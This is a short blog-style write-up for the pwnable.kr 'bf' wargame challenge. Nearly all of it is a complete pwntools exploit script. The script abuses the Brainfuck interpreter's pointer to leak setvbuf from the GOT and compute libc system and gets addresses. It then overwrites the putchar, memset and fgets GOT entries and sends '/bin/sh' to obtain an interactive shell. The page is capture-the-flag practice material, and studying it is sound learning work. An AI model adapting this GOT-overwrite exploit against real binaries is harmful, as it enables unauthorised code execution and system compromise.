---
title: '[wargame-pwnable] bf'
date: 2016-06-08 15:40:00
tags:
 - pwn
 - wargame
---

got表的姿势

```python
from pwn import *

context(log_level="debug")
# p = process('./bf')
p = remote('pwnable.kr',9001)
elf = ELF('bf')
#readelf -s bf_libc.so |grep system
libc_system_addr = 0x0003f250
libc_setvbuf_addr = 0x00067f70
libc_gets_addr = 0x00066e50
p_addr = 0x0804A0A0
vul_addr = 0x08048671
putchar_got = elf.got['putchar']
setvbuf_got = elf.got['setvbuf']
memset_got =  elf.got['memset']
fgets_got  = elf.got['fgets']

payload  = ''
payload += '<'*(p_addr-setvbuf_got) # point to setvbuf_got
payload += '.'+'>'+'.'+'>'+'.'+'>'+'.'+'>'+ '<'*4 #leak setvbuf()
payload += '>'*(putchar_got-setvbuf_got)#point to putchar_got
payload += ','+'>'+','+'>'+','+'>'+','+'>'+'<'*4 #change putchar() to vul_addr
payload += '<'*(putchar_got-memset_got)#point to memset_got
payload += ','+'>'+','+'>'+','+'>'+','+'>'+'<'*4 #change memset() to gets()
payload += '<'*(memset_got-fgets_got)#point to fgets_got
payload += ','+'>'+','+'>'+','+'>'+','+'>'+'<'*4 #change fgets() to gets()
payload +='.'
print 'length = '+hex(len(payload))
# gdb.attach(p,'b*0x804865A\nb*0x8048648\nc')
p.recvuntil('pt [ ]\n')
p.sendline(payload)
leak = p.recv(1)+p.recv(1)+p.recv(1)+p.recv(1)
leak_setvbuf = u32(leak)
print 'putchar_got_addr = '+hex(putchar_got)

print 'leak_setvbuf = '+hex(leak_setvbuf)

system_addr = leak_setvbuf - (libc_setvbuf_addr-libc_system_addr)
gets_addr = leak_setvbuf - (libc_setvbuf_addr-libc_gets_addr)
print 'system_addr = ' + hex(system_addr) 
print 'gets_addr = '+hex(gets_addr)
print '###change putchar to  vul_addr'
p.send(p32(vul_addr))
print '###change memset to  gets'
p.send(p32(gets_addr))
print '###change fgets to system'
p.send(p32(system_addr))
print "###send '/bin/sh'"
p.sendline('/bin/sh\0')
p.interactive()
```